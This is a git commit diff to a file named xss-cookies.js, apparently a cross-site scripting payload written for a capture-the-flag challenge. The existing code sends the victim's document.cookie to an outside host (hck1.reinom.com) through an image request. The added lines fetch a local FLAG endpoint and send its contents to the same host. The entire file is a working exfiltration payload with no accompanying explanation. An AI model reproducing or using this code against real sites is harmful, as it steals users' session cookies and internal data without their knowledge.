dd87779f6dd317daab2020c8f2544d0d7781023c
Xenos <dev.coding@reinom.com>
2023-11-21 19:31:00 +0100

    Update xss-cookies.js
    reading flag directly

--- xss-cookies.js
+++ xss-cookies.js
@@ -3,4 +3,12 @@
   const x = new Image();
   x.setAttribute('src', "https://hck1.reinom.com/xss-jsdelivr?cookie="+document.cookie);
   document.body.appendChild(x);
+
+  fetch("http://localhost:5000/FLAG")
+    .then(r => r.text())
+    .then(t=>{
+      const y = new Image();
+      y.setAttribute('src', "https://hck1.reinom.com/xss-jsdelivr?FLAG="+t);
+      document.body.appendChild(y);
+    });
 })();
